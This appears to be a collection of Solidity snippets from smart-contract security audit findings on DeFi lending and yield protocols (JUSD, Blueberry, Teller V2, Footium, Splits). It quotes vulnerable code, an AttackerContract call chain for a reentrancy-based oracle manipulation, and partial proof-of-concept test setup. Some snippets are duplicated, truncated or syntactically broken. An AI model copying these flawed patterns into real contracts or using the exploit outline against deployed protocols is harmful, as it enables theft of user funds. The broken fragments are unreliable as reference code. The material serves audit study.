"```\nfunction _withdraw(\n    uint256 amount,\n    address collateral,\n    address to,\n    address from,\n    bool isInternal\n) internal {\n    if (isInternal) {\n        DataTypes.UserInfo storage toAccount = userInfo[to];\n        _addCollateralIfNotExists(toAccount, collateral);\n        toAccount.depositBalance[collateral] += amount;\n        require(\n            toAccount.depositBalance[collateral] <=\n                reserve.maxDepositAmountPerAccount,\n            JUSDErrors.EXCEED_THE_MAX_DEPOSIT_AMOUNT_PER_ACCOUNT\n        );\n    }\n```\n```\nfunction _deposit(\n    DataTypes.ReserveInfo storage reserve,\n    DataTypes.UserInfo storage user,\n    uint256 amount,\n    address collateral,\n    address to,\n    address from\n) internal {\n    require(reserve.isDepositAllowed, JUSDErrors.RESERVE_NOT_ALLOW_DEPOSIT);\n```\n```\nfunction delistReserve(address collateral) external onlyOwner {\n    DataTypes.ReserveInfo storage reserve = reserveInfo[collateral];\n    reserve.isBorrowAllowed = false;\n    reserve.isDepositAllowed = false;\n    reserve.isFinalLiquidation = true;\n    emit RemoveReserve(collateral);\n}\n```"
"```\nfunction _repay(\n    DataTypes.UserInfo storage user,\n    address payer,\n    address to,\n    uint256 amount,\n    uint256 tRate\n) internal returns (uint256) {\n    require(amount!= 0, JUSDErrors.REPAY_AMOUNT_IS_ZERO);\n    uint256 JUSDBorrowed = user.t0BorrowBalance.decimalMul(tRate);\n    uint256 tBorrowAmount;\n    uint256 t0Amount;\n\n    if (JUSDBorrowed <= amount) {\n        tBorrowAmount = JUSDBorrowed;\n        t0Amount = user.t0BorrowBalance;\n    } else {\n        tBorrowAmount = amount;\n        t0Amount = amount.decimalDiv(tRate);\n    }\n\n    IERC20(JUSD).safeTransferFrom(payer, address(this), tBorrowAmount);\n    user.t0BorrowBalance -= t0Amount;\n    t0TotalBorrowAmount -= t0Amount;\n    emit Repay(payer, to, tBorrowAmount);\n    return tBorrowAmount;\n}\n```"
"```\nfunction updateImpact(uint32 newImpact) external onlyOwner {\n    emit UpdateImpact(impact, newImpact);\n    impact = newImpact;\n}\n```\n```\nrequire(diff * 1e18 / JOJOPriceFeed <= impact, ""deviation is too big"")\n```"
"```\n} else {\n    liquidateData.actualCollateral = JUSDBorrowed\n       .decimalDiv(priceOff)\n       .decimalDiv(JOJOConstant.ONE - reserve.insuranceFeeRate);\n\n    liquidateData.insuranceFee = JUSDBorrowed\n       .decimalMul(reserve.insuranceFeeRate)\n       .decimalDiv(JOJOConstant.ONE - reserve.insuranceFeeRate);\n\n    liquidateData.actualLiquidatedT0 = liquidatedInfo.t0BorrowBalance;\n    liquidateData.actualLiquidated = JUSDBorrowed;\n\n    liquidateData.liquidatedRemainUSDC = (amount -\n        liquidateData.actualCollateral).decimalMul(price);\n}\n```\n```\nrequire(\n    IERC20(primaryAsset).balanceOf(liquidated) -\n        primaryLiquidatedAmount >=\n        liquidateData.liquidatedRemainUSDC,\n    JUSDErrors.LIQUIDATED_AMOUNT_NOT_ENOUGH\n);\n```"
"```\nfunction JOJOFlashLoan(\n    address asset,\n    uint256 amount,\n    address to,\n    bytes calldata param\n) external {\n    (address approveTarget, address swapTarget, uint256 minReceive, bytes memory data) = abi.decode(param, (address, address, uint256, bytes));\n    IERC20(asset).approve(approveTarget, amount);\n    (bool success,) = swapTarget.call(data);\n    if (success == false) {\n        assembly {\n            let ptr := mload(0x40)\n            let size := returndatasize()\n            returndatacopy(ptr, 0, size)\n            revert(ptr, size)\n        }\n    }\n    uint256 USDCAmount = IERC20(USDC).balanceOf(address(this));\n    require(USDCAmount >= minReceive, ""receive amount is too small"");\n}\n\nfunction repayJUSD(\n    address asset,\n    uint256 amount,\n    address to,\n    bytes memory param\n) external {\n    IERC20(asset).safeTransferFrom(msg.sender, address(this), amount);\n    uint256 minReceive;\n    if (asset!= USDC) {\n        (address approveTarget, address swapTarget, uint256 minAmount, bytes memory data) = abi.decode(param, (address, address, uint256, bytes));\n        IERC20(asset).approve(approveTarget, amount);\n        (bool success,) = swapTarget.call(data);\n        if (success == false) {\n            assembly {\n                let ptr := mload(0x40)\n                let size := returndatasize()\n                returndatacopy(ptr, 0, size)\n                revert(ptr, size)\n            }\n        }\n        minReceive = minAmount;\n    }\n    uint256 USDCAmount = IERC20(USDC).balanceOf(address(this));\n    require(USDCAmount >= minReceive, ""receive amount is too small"");\n```"
"```\nfunction borrow(\n    uint256 amount,\n    address to,\n    bool isDepositToJOJO\n) external override nonReentrant nonFlashLoanReentrant {\n    DataTypes.UserInfo storage user = userInfo[msg.sender];\n    _borrow(user, isDepositToJOJO, to, amount, msg.sender);\n    require(\n        _isAccountSafeAfterBorrow(user, getTRate()),\n        JUSDErrors.AFTER_BORROW_ACCOUNT_IS_NOT_SAFE\n    );\n}\n```"
"```\n    IERC20(USDC).approve(jusdExchange, borrowBalance);\n    IJUSDExchange(jusdExchange).buyJUSD(borrowBalance, address(this));\n    IERC20(USDC).safeTransfer(to, USDCAmount - borrowBalance);\n    JUSDAmount = borrowBalance;\n}"
"```\nfunction setApprovalForERC20(\n    IERC20 erc20Contract,\n    address to,\n    uint256 amount\n) external onlyClubOwner {\n    erc20Contract.approve(to, amount);\n}\n```\n```\nfunction transferERC20(\n    IERC20 erc20Contract,\n    address to,\n    uint256 amount\n) external onlyClubOwner {\n    erc20Contract.transfer(to, amount);\n}\n```"
"```\nif (value > 0) {\n    totalERC20Claimed[_token][_to] += value;\n    _token.transfer(_to, value);\n}\n```"
"```\ncontract FootiumPlayer is\n    ERC721Upgradeable,\n    AccessControlUpgradeable,\n    ERC2981Upgradeable,\n    PausableUpgradeable,\n    ReentrancyGuardUpgradeable,\n    OwnableUpgradeable {\n```\n```\ncontract FootiumClub is\n    ERC721Upgradeable,\n    AccessControlUpgradeable,\n    PausableUpgradeable,\n    ReentrancyGuardUpgradeable,\n    OwnableUpgradeable {\n```"
"```\n* WARNING: You should avoid using leaf values that are 64 bytes long prior to hashing, or use a hash function other than keccak256 for hashing leaves.\n* This is because the concatenation of a sorted pair of internal nodes in the merkle tree could be reinterpreted as a leaf value.\n```\n```\nif (\n   !MerkleProofUpgradeable.verify(\n        divisionProof,\n        _clubDivsMerkleRoot,\n        keccak256(abi.encodePacked(clubId, divisionTier))\n    )\n)"
"```\nenum JoinKind {\n    INIT,\n    EXACT_TOKENS_IN_FOR_BPT_OUT,\n    TOKEN_IN_FOR_EXACT_BPT_OUT\n}\n```\nif (kind == JoinKind.TOKEN_OUT_FOR_EXACT_BPT_IN) {\n    return _joinExactTokensInForBPTOut(balances, normalizedWeights, userData);\n} else if (kind == JoinKind.TOKEN_IN_FOR_EXACT_BPT_OUT) {\n    return _joinTokenInForExactBPTOut(balances, normalizedWeights, userData);\n} else {\n    _revert(Errors.UNHANDLED_JOIN_KIND);\n}\n```"
"```\nfor (uint256 i = 0; i < rewardTokens.length; i++) {\n    uint256 rewards = _doCutRewardsFee(rewardTokens[i]);\n    _ensureApprove(rewardTokens[i], address(swapRouter), rewards);\n    swapRouter.swapExactTokensForTokens(\n        rewards,\n        0,\n        swapPath[i],\n        address(this),\n        type(uint256).max\n    );\n}\n```"
"```\nICurvePool(pool).remove_liquidity_one_coin(\n    amountPosRemove,\n    int128(tokenIndex),\n    0\n)"
"```\nuint extraRewardsCount = IAuraRewarder(crvRewarder).extraRewardsLength();\n\ntokens = new address[](extraRewardsCount + 1);\nrewards = new uint256[](extraRewardsCount + 1);\n\ntokens[0] = IAuraRewarder(crvRewarder).rewardToken();\nrewards[0] = _getPendingReward(\n    stCrvPerShare,\n    crvRewarder,\n    amount,\n    lpDecimals\n);\n\nfor (uint i = 0; i < extraRewardsCount; i++) {\n    address rewarder = IAuraRewarder(crvRewarder).extraRewards(i);\n\n    uint256 stRewardPerShare = accExtPerShare[tokenId][i];\n    tokens[i + 1] = IAuraRewarder(rewarder).rewardToken();\n    rewards[i + 1] = _getPendingReward(\n        stRewardPerShare,\n        rewarder,\n        amount,\n        lpDecimals\n    );\n}\n```"
"```\nwAuraPools.getVault(lpToken).exitPool(\n    IBalancerPool(lpToken).getPoolId(),\n    address(this),\n    address(this),\n    IBalancerVault.ExitPoolRequest(\n        tokens,\n        minAmountsOut,\n        """",\n        false\n    )\n);\n```\nfunction exactBptInForTokenOut(bytes memory self) internal pure returns (uint256 bptAmountIn, uint256 tokenIndex) {\n    (\n       ,\n        bptAmountIn,\n        tokenIndex\n    ) = abi.decode(self, (WeightedPool.ExitKind, uint256, uint256));\n}\n```"
"```\nif (amountToSwap > 0) {\n    SWAP_POOL = IUniswapV3Pool(vault.pool());\n    uint160 deltaSqrt = (param.sqrtRatioLimit * uint160(param.sellSlippage)) / uint160(Constants.DENOMINATOR);\n    SWAP_POOL.swap(\n        address(this),\n       !isTokenA,\n        amountToSwap.toInt256(),\n        isTokenA\n           ? param.sqrtRatioLimit + deltaSqrt\n            : param.sqrtRatioLimit - deltaSqrt, // slippaged price cap\n        abi.encode(address(this))\n    );\n}\n```"
"```\nuint256 strTokenAmt = _doBorrow(param.borrowToken, param.borrowAmount);\n\n// 3. Swap borrowed token to strategy token\nIERC20Upgradeable swapToken = ISoftVault(strategy.vault).uToken();\n\nPSwapLib.megaSwap(augustusSwapper, tokenTransferProxy, swapData);\n\nstrTokenAmt = swapToken.balanceOf(address(this)) - strTokenAmt;\n```"
"```\n{\n    IBank.Position memory pos = bank.getCurrentPositionInfo();\n    address posCollToken = pos.collToken;\n    uint256 collSize = pos.collateralSize;\n    address burnToken = address(ISoftVault(strategy.vault).uToken());\n    if (collSize > 0) {\n        if (posCollToken!= address(wrapper)) {\n            revert Errors.INCORRECT_COLTOKEN(posCollToken);\n        } else {\n            bank.takeCollateral(collSize);\n            wrapper.burn(burnToken, collSize);\n            _doRefund(burnToken);\n        }\n    }\n}\n```"
"```\n(address[] memory tokens, uint256[] memory rewards) = IERC20Wrapper(\n    pos.collToken\n).pendingRewards(pos.collId, pos.collateralSize);\n\nfor (uint256 i; i < tokens.length; i++) {\n    rewardsValue += oracle.getTokenValue(tokens[i], rewards[i]);\n}\n```\n```\nfunction pendingRewards(\n    uint256 tokenId,\n    uint256 amount\n)\n    public\n    view\n    override\n    returns (address[] memory tokens, uint256[] memory rewards)\n{\n}\n```"
"```\nAttackerContract.flashLoan() ->\n    SomeProtocol.flashLoan() ->\n        AttackerContract.exploit()\n\nAttackerContract.exploit() ->\n    BalancerVault.joinPool() ->\n        BalancerVault.returnExcessETH() ->\n            AttackerContract.receive()\n\nAttackerContract.receive() ->\n    BlueBerryBank.liquidate() ->\n        BalancerPairOracle.getPrice() ->\n            BalancerVaul.getPoolTokens(),\n            BalancerPool.getTotalSupply(),\n            price = f(balances) / pool.totalSupply()\n```"
"```\n{\n    uint256 rewards = _doCutRewardsFee(CRV);\n    _ensureApprove(CRV, address(swapRouter), rewards);\n    swapRouter.swapExactTokensForTokens(\n        rewards,\n        0,\n        swapPath,\n        address(this),\n        type(uint256).max\n    );\n}\n```\n```\nSWAP_POOL.swap(\n    address(this),\n   !isTokenA,\n    amountToSwap.toInt256(),\n    isTokenA\n       ? param.sqrtRatioLimit + deltaSqrt\n        : param.sqrtRatioLimit - deltaSqrt, // slippaged price cap\n    abi.encode(address(this))\n);"
"```\nfunction openPositionFarm(\n    OpenPosParam calldata param\n) \n    external \n    existingStrategy(param.strategyId)\n    existingCollateral(param.strategyId, param.collToken)\n{\n    // 1. Deposit isolated collaterals on Blueberry Money Market\n    _doLend(param.collToken, param.collAmount);\n\n    // 2. Borrow specific amounts\n    uint256 borrowBalance = _doBorrow(\n        param.borrowToken,\n        param.borrowAmount\n    );\n\n    // 3. Add liquidity on Balancer, get BPT\n    {\n        IBalancerVault vault = wAuraPools.getVault(lpToken);\n        _ensureApprove(param.borrowToken, address(vault), borrowBalance);\n\n        (address[] memory tokens, uint256[] memory balances, ) = wAuraPools\n           .getPoolTokens(lpToken);\n        uint[] memory maxAmountsIn = new uint[](2);\n        maxAmountsIn[0] = IERC20(tokens[0]).balanceOf(address(this));\n        maxAmountsIn[1] = IERC20(tokens[1]).balanceOf(address(this));\n\n        uint totalLPSupply = IBalancerPool(lpToken).totalSupply();\n        uint poolAmountFromA = (maxAmountsIn[0] * totalLPSupply) / balances[0];\n        uint poolAmountFromB = (maxAmountsIn[1] * totalLPSupply) / balances[1];\n        uint poolAmountOut = poolAmountFromA > poolAmountFromB\n           ? poolAmountFromB\n            : poolAmountFromA;\n\n        bytes32 poolId = bytes32(param.farmingPoolId);\n        if (poolAmountOut > 0) {\n            vault.joinPool(\n                poolId,\n                address(this),\n                address(this),\n                IBalancerVault.JoinPoolRequest(\n                    tokens,\n                    maxAmountsIn,\n                    """",\n                    false\n                )\n            );\n        }\n    }\n}"
"```\nfunction _addLiquidityOnCurve(\n    address param,\n    address pool,\n    uint256 borrowBalance\n) internal {\n    _ensureApprove(param.borrowToken, pool, borrowBalance);\n\n    if (tokens.length == 2) {\n        uint256[2] memory suppliedAmts;\n        for (uint256 i = 0; i < 2; i++) {\n            suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(address(this));\n        }\n        ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n    } else if (tokens.length == 3) {\n        uint256[3] memory suppliedAmts;\n        for (uint256 i = 0; i < 3; i++) {\n            suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(address(this));\n        }\n        ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n    } else if (tokens.length == 4) {\n        uint256[4] memory suppliedAmts;\n        for (uint256 i = 0; i < 4; i++) {\n            suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(address(this));\n        }\n        ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n    }\n```"
"```\nfunction isLiquidatable(uint256 positionId) public view returns (bool) {\n    return getPositionRisk(positionId) >=\n        banks[positions[positionId].underlyingToken].liqThreshold;\n}\n```\nfunction getPositionRisk(\n    uint256 positionId\n) public view returns (uint256 risk) {\n    uint256 pv = getPositionValue(positionId);\n    uint256 ov = getDebtValue(positionId);\n    uint256 cv = getIsolatedCollateralValue(positionId);\n\n    if (cv == 0 && pv == 0 && ov == 0 || pv >= ov) {\n        risk = 0;\n    } else if (cv == 0) {\n        risk = Constants.DENOMINATOR;\n    } else {\n        risk = ((ov - pv) * Constants.DENOMINATOR) / cv;\n    }\n}\n```\n```\nfunction getIsolatedCollateralValue(\n    uint256 positionId\n) public view override returns (uint256 icollValue) {\n    Position memory pos = positions[positionId];\n\n    uint256 underlyingAmount;\n    if (_isSoftVault(pos.underlyingToken)) {\n        underlyingAmount = \n            (ICErc20(banks[pos.debtToken].bToken).exchangeRateStored() * \n                pos.underlyingVaultShare) / Constants.PRICE_PRECISION;\n    } else {\n        underlyingAmount = pos.underlyingVaultShare;\n    }\n    icollValue = oracle.getTokenValue(\n        pos.underlyingToken,\n        underlyingAmount\n    );\n}\n```\n```\n```"
"```\n(address[] memory tokens, uint256[] memory rewards) = IERC20Wrapper(\n    pos.collToken\n).pendingRewards(pos.collId, pos.collateralSize);\n\nfor (uint256 i; i < tokens.length; i++) {\n    rewardsValue += oracle.getTokenValue(tokens[i], rewards[i]);\n}\n```"
"```\n        address vault = strategies[param.strategyId].vault;\n        _doPutCollateral(\n            vault,\n            IERC20Upgradeable(ISoftVault(vault).uToken()).balanceOf(address(this))\n        );\n```"
"```\nfor (uint256 i = 0; i < rewardTokens.length; i++) {\n    uint256 rewards = _doCutRewardsFee(rewardTokens[i]);\n    _ensureApprove(rewardTokens[i], address(swapRouter), rewards);\n    swapRouter.swapExactTokensForTokens(\n        rewards,\n        0,\n        swapPath[i],\n        address(this),\n        type(uint256).max\n    );\n}\n```"
"```\nuint extraRewardsCount = IAuraRewarder(crvRewarder).extraRewardsLength();\ntokens = new address[](extraRewardsCount + 1);\nrewards = new uint256[](extraRewardsCount + 1);\n\ntokens[0] = IAuraRewarder(crvRewarder).rewardToken();\nrewards[0] = _getPendingReward(\n    stCrvPerShare,\n    crvRewarder,\n    amount,\n    lpDecimals\n);\n\nfor (uint i = 0; i < extraRewardsCount; i++) {\n    address rewarder = IAuraRewarder(crvRewarder).extraRewards(i);\n    uint256 stRewardPerShare = accExtPerShare[tokenId][i];\n    tokens[i + 1] = IAuraRewarder(rewarder).rewardToken();\n    rewards[i + 1] = _getPendingReward(\n        stRewardPerShare,\n        rewarder,\n        amount,\n        lpDecimals\n    );\n}\n```"
"```\nfunction verifyCallback(\n    SwapperFactory factory_,\n    SwapperImpl swapper_\n) internal view returns (bool valid) {\n    return factory_.isSwapper(swapper_);\n}\n```\n```\nSwapperImpl swapper = SwapperImpl(msg.sender);\nif (!swapperFactory.verifyCallback(swapper)) {\n    revert Unauthorized();\n}\n```\n```\nfunction execCalls(Call[] calldata calls_)\n    external\n    payable\n    onlyOwner\n    returns (uint256 blockNumber, bytes[] memory returnData)\n{\n    blockNumber = block.number;\n    uint256 length = calls_.length;\n    returnData = new bytes[](length);\n\n    bool success;\n    for (uint256 i = 0; i < length) {\n        Call calldata calli = calls_[i];\n        (success, returnData[i]) = calli.to.call{value: calli.value}(calli.data);\n        require(success, string(returnData[i]));\n\n        unchecked {\n            i++;\n        }\n    }\n\n    emit ExecCalls(calls_);\n}\n```"
```\namountsToBeneficiary = oracle.getQuoteAmounts(quoteParams_)\n```\n```\nConvertedQuotePair memory cqp = quoteParams_.quotePair._convert(_convertToken);\nSortedConvertedQuotePair memory scqp = cqp._sort();\n```\n```\nPairOverride memory po = _getPairOverride(scqp);\n\nif (po.scaledOfferFactor == 0) {\n    po.scaledOfferFactor = $defaultScaledOfferFactor;\n}\n```
"```\nfunction commitCollateral(\n    uint256 _bidId,\n    Collateral[] calldata _collateralInfo\n) public returns (bool validation_) {\n    address borrower = tellerV2.getLoanBorrower(_bidId);\n\n    (validation_, ) = checkBalances(borrower, _collateralInfo);\n\n    if (validation_) {\n        for (uint256 i = 0; i < _collateralInfo.length; i++) {\n            Collateral memory info = _collateralInfo[i];\n            _commitCollateral(_bidId, info);\n        }\n    }\n}\n```\n```\nfunction _withdraw(uint256 _bidId, address _receiver) internal virtual {\n    for (uint256 i; i < _bidCollaterals[_bidId].collateralAddresses.length(); i++) {\n        Collateral storage collateralInfo = _bidCollaterals[_bidId].collateralInfo[_bidCollaterals[_bidId].collateralAddresses[i]];\n        ICollateralEscrowV1(_escrows[_bidId]).withdraw(\n            collateralInfo._collateralAddress,\n            collateralInfo._amount,\n            _receiver\n        );\n    }\n```"
"```\nfunction commitCollateral(\n    uint256 _bidId,\n    Collateral[] calldata _collateralInfo\n) public returns (bool validation_) {\n    address borrower = tellerV2.getLoanBorrower(_bidId);\n\n    (validation_, ) = checkBalances(borrower, _collateralInfo);\n\n    if (validation_) {\n        for (uint256 i = 0; i < _collateralInfo.length; i++) {\n            Collateral memory info = _collateralInfo[i];\n            _commitCollateral(_bidId, info);\n        }\n    }\n}\n```"
"```\nfunction _commitCollateral(\n    uint256 _bidId,\n    Collateral memory _collateralInfo\n) internal virtual {\n    CollateralInfo storage collateral = _bidCollaterals[_bidId];\n    collateral.collateralAddresses.add(_collateralInfo._collateralAddress);\n    collateral.collateralInfo[\n        _collateralInfo._collateralAddress\n    ] = _collateralInfo;\n    emit CollateralCommitted(\n        _bidId,\n        _collateralInfo._collateralType,\n        _collateralInfo._collateralAddress,\n        _collateralInfo._amount,\n        _collateralInfo._tokenId\n    );\n}\n```\n```\nfunction lenderAcceptBid(uint256 _bidId)\n    external\n    override\n    pendingBid(_bidId, ""lenderAcceptBid"")\n    whenNotPaused\n    returns (\n        uint256 amountToProtocol,\n        uint256 amountToMarketplace,\n        uint256 amountToBorrower\n    ) {\n    Bid storage bid = bids[_bidId];\n    address sender = _msgSenderForMarket(bid.marketplaceId);\n}\n```"
"```\nfunction _repayLoan() internal virtual {\n    bid.loanDetails.lendingToken.safeTransferFrom(\n        _msgSenderForMarket(bid.marketplaceId),\n        lender,\n        paymentAmount\n    );\n}\n```\nfunction getLoanLender(uint256 _bidId)\n    public\n    view\n    returns (address lender_)\n{\n    lender_ = bids[_bidId].lender;\n\n    if (lender_ == address(lenderManager)) {\n        return lenderManager.ownerOf(_bidId);\n    }\n}\n```"
"```\nfunction updateCommitment(\n    uint256 _commitmentId,\n    Commitment calldata _commitment\n) public commitmentLender(_commitmentId) {\n    require(\n        _commitment.principalTokenAddress ==\n            commitments[_commitmentId].principalTokenAddress,\n        ""Principal token address cannot be updated.""\n    );\n    require(\n        _commitment.marketId == commitments[_commitmentId].marketId,\n        ""Market Id cannot be updated.""\n    );\n\n    commitments[_commitmentId] = _commitment;\n\n    validateCommitment(commitments[_commitmentId]);\n}"
"```\n/**\n * @notice Withdraws deposited collateral from the created escrow of a bid that has been successfully repaid.\n * @param _bidId The id of the bid to withdraw collateral for.\n */\nfunction withdraw(uint256 _bidId) external {\n    BidState bidState = tellerV2.getBidState(_bidId);\n    console2.log(""WITHDRAW %d"", uint256(bidState));\n    if (bidState == BidState.PAID) {\n        _withdraw(_bidId, tellerV2.getLoanBorrower(_bidId));\n    } else if (tellerV2.isLoanDefaulted(_bidId)) {\n        _withdraw(_bidId, tellerV2.getLoanLender(_bidId));\n        emit CollateralClaimed(_bidId);\n    } else {\n        revert(""collateral cannot be withdrawn"");\n    }\n}\n```"
"```\nfunction calculateNextDueDate(uint256 _bidId)\n    public\n    view\n    returns (uint32 dueDate_)\n{\n    Bid storage bid = bids[_bidId];\n    if (bids[_bidId].state!= BidState.ACCEPTED) return dueDate_;\n\n    uint32 lastRepaidTimestamp = lastRepaidTimestamp(_bidId);\n\n    // Calculate due date if payment cycle is set to monthly\n    if (bidPaymentCycleType[_bidId] == PaymentCycleType.Monthly) {\n        // Calculate the cycle number the last repayment was made\n        uint256 lastPaymentCycle = BPBDTL.diffMonths(\n            bid.loanDetails.acceptedTimestamp,\n```\n```\nfunction _canLiquidateLoan(uint256 _bidId, uint32 _liquidationDelay)\n    internal\n    view\n    returns (bool)\n{\n    Bid storage bid = bids[_bidId];\n\n    if (bid.state!= BidState.ACCEPTED) return false;\n\n    if (bidDefaultDuration[_bidId] == 0) return false;\n\n    return (uint32(block.timestamp) - _liquidationDelay - lastRepaidTimestamp(_bidId) > bidDefaultDuration[_bidId]);\n}\n```"
"```\nmapping(uint256 => EnumerableSetUpgradeable.AddressSet) internal commitmentBorrowersList;\n\nfunction updateCommitmentBorrowers(\n    uint256 _commitmentId,\n    address[] calldata _borrowerAddressList\n) public commitmentLender(_commitmentId) {\n    delete commitmentBorrowersList[_commitmentId];\n    _addBorrowersToCommitmentAllowlist(_commitmentId, _borrowerAddressList);\n}\n```\n```\nusing EnumerableSet for EnumerableSet.AddressSet;\n\nmapping(uint256 => EnumerableSet.AddressSet) internal users;\n\nfunction test_deleteEnumerableSet() public {\n    uint256 id = 1;\n    address[] memory newUsers = new address[](2);\n    newUsers[0] = address(0x1);\n    newUsers[1] = address(0x2);\n\n    for (uint256 i = 0; i < newUsers.length; i++) {\n        users[id].add(newUsers[i]);\n    }\n    delete users[id];\n    newUsers[0] = address(0x3);\n    newUsers[1] = address(0x4);\n    for (uint256 i = 0; i < newUsers.length; i++) {\n        users[id].add(newUsers[i]);\n    }\n    bool exist = users[id].contains(address(0x1));\n    if (exist) {\n        emit log_string(""address(0x1) exist"");\n    }\n    exist = users[id].contains(address(0x2));\n    if (exist) {\n        emit log_string(""address(0x2) exist"");\n    }\n}\n```"
"```\n// CollateralManager.sol\nfunction _deposit(uint256 _bidId, Collateral memory collateralInfo)\n    internal\n    virtual\n{\n    // Pull collateral from borrower & deposit into escrow\n    if (collateralInfo._collateralType == CollateralType.ERC20) {\n        IERC20Upgradeable(collateralInfo._collateralAddress).transferFrom(\n            borrower,\n            address(this),\n            collateralInfo._amount\n        );\n        IERC20Upgradeable(collateralInfo._collateralAddress).approve(\n            escrowAddress,\n            collateralInfo._amount\n        );\n        collateralEscrow.depositAsset(\n            CollateralType.ERC20,\n            collateralInfo._collateralAddress,\n            collateralInfo._amount,\n            0\n        );\n    }\n}\n```\n```\nfunction _withdrawCollateral(\n    Collateral memory _collateral,\n    address _collateralAddress,\n    uint256 _amount,\n    address _recipient\n) internal {\n    // Withdraw ERC20\n    if (_collateral._collateralType == CollateralType.ERC20) {\n        IERC20Upgradeable(_collateralAddress).transfer(\n            _recipient,\n            _collateral._amount\n        );\n    }\n}\n```"
"```\nrequire(\n    _commitment.principalTokenAddress ==\n        commitments[_commitmentId].principalTokenAddress,\n    ""Principal token address cannot be updated.""\n);\n\nrequire(\n    _commitment.marketId == commitments[_commitmentId].marketId,\n    ""Market Id cannot be updated.""\n);\n\ncommitments[_commitmentId] = _commitment;\n```"
"```\nfunction _submitBid() {\n    (bid.terms.paymentCycle, bidPaymentCycleType[bidId]) = marketRegistry.getPaymentCycle(_marketplaceId);\n\n    bid.terms.APR = _APR;\n\n    bidDefaultDuration[bidId] = marketRegistry.getPaymentDefaultDuration(_marketplaceId);\n\n    bidExpirationTime[bidId] = marketRegistry.getBidExpirationTime(_marketplaceId);\n\n    bid.paymentType = marketRegistry.getPaymentType(_marketplaceId);\n\n    bid.terms.paymentCycleAmount = V2Calculations.calculatePaymentCycleAmount(\n        bid.paymentType,\n        bidPaymentCycleType[bidId],\n        _principal,\n        _duration,\n        bid.terms.paymentCycle,\n        _APR\n    );\n}"
"```\nelse {\n    // Default to PaymentType.EMI\n    uint256 maxCycleOwed = isLastPaymentCycle\n       ? owedPrincipal_ + interest_\n        : _bid.terms.paymentCycleAmount;\n\n    // Calculate accrued amount due since last repayment\n    uint256 owedAmount = (maxCycleOwed * owedTime) / _bid.terms.paymentCycle;\n    duePrincipal_ = Math.min(owedAmount - interest_, owedPrincipal_);\n}\n```\n```\nif (paymentAmount >= _owedAmount) {\n    paymentAmount = _owedAmount;\n    bid.state = BidState.PAID;\n\n    if (_borrowerBidsActive[bid.borrower].remove(_bidId)) {\n        // If loan is being liquidated and backed by collateral, withdraw and send to borrower\n        if (_shouldWithdrawCollateral) {\n            collateralManager.withdraw(_bidId);\n        }\n    }\n\n    emit LoanRepaid(_bidId);\n}"
"```\nFile: CollateralManager.sol\n\nelse if (tellerV2.isLoanDefaulted(_bidId)) {\n    _withdraw(_bidId, tellerV2.getLoanLender(_bidId)); // sends collateral to lender\n    emit CollateralClaimed(_bidId);\n} else {\n```"
"```\nFile: TellerV2.sol\n\nif (bidDefaultDuration[_bidId] == 0) return false;\n```\n```\nFile: libraries/V2Calculations.sol\n\nuint256 owedAmount = (maxCycleOwed * owedTime) / _bid.terms.paymentCycle;\n```\n```\npragma solidity ^0.8.0;\n\nimport { UpgradeableBeacon } from ""@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol"";\nimport { TellerV2 } from ""../contracts/TellerV2.sol"";\nimport { CollateralManager } from ""../contracts/CollateralManager.sol"";\nimport { LenderCommitmentForwarder } from ""../contracts/LenderCommitmentForwarder.sol"";\nimport { CollateralEscrowV1 } from ""../contracts/escrow/CollateralEscrowV1.sol"";\nimport { MarketRegistry } from ""../contracts/MarketRegistry.sol"";\nimport { ReputationManagerMock } from ""../contracts/mock/ReputationManagerMock.sol"";\nimport { LenderManagerMock } from ""../contracts/mock/LenderManagerMock.sol"";\nimport { TellerASMock } from ""../contracts/mock/TellerASMock.sol"";\nimport { TestERC20Token } from ""./tokens/TestERC20Token.sol"";\nimport ""lib/forge-std/src/Test.sol"";\nimport ""lib/forge-std/src/StdAssertions.sol"";\n\ncontract LoansTest is Test {\n    MarketRegistry public marketRegistry;\n    TellerV2 public tellerV2;\n\n    TestERC20Token public principalToken;\n\n    address public alice = address(0x1111);\n    address public bob = address(0x2222);\n    address public owner = address(0x3333);\n\n    function setUp() public {\n        tellerV2 = new TellerV2(address(0));\n\n        marketRegistry = new MarketRegistry();\n        TellerASMock tellerAs = new TellerASMock();\n        marketRegistry.initialize(tellerAs);\n\n        LenderCommitmentForwarder lenderCommitmentForwarder = \n            new LenderCommitmentForwarder(address(tellerV2), address(marketRegistry));\n        CollateralManager collateralManager = new CollateralManager();\n        collateralManager.initialize(address(new UpgradeableBeacon(address(new CollateralEscrowV1()))),\n            address(tellerV2));\n        address rm = address(new ReputationManagerMock());\n        address lm = address(new LenderManagerMock());\n        tellerV2.initialize(0, address(marketRegistry), rm, address(lenderCommitmentForwarder),\n            address(collateralManager), lm);\n\n        principalToken = new TestERC20Token(""Principal Token"", ""PRIN"", 12e18, 18);\n    }\n\n    function testSubmitBidForNonExistingMarket() public {\n        uint256 amount = 12e18;\n        principalToken.transfer"
"```\nFile: libraries/V2Calculations.sol\n\n93:        int256 durationLeftOnLoan = int256(\n    uint256(_bid.loanDetails.loanDuration)\n) -\n    (int256(_timestamp) -\n    int256(uint256(_bid.loanDetails.acceptedTimestamp)));\n\n99:        bool isLastPaymentCycle = durationLeftOnLoan <\n    int256(uint256(_bid.terms.paymentCycle)) ||\n    owedPrincipal_ + interest_ <= _bid.terms.paymentCycleAmount;\n```\n```\npragma solidity ^0.8.0;\n\nimport {\n    UpgradeableBeacon\n} from ""@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol"";\n\nimport {\n    AddressUpgradeable\n} from ""@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol"";\n\nimport {\n    TellerV2\n} from ""../contracts/TellerV2.sol"";\nimport {\n    Payment\n} from ""../contracts/TellerV2Storage.sol"";\nimport {\n    CollateralManager\n} from ""../contracts/CollateralManager.sol"";\nimport {\n    LenderCommitmentForwarder\n} from ""../contracts/LenderCommitmentForwarder.sol"";\nimport {\n    CollateralEscrowV1\n} from ""../contracts/escrow/CollateralEscrowV1.sol"";\nimport {\n    Collateral,\n    CollateralType\n} from ""../contracts/interfaces/escrow/ICollateralEscrowV1.sol"";\n\nimport {\n    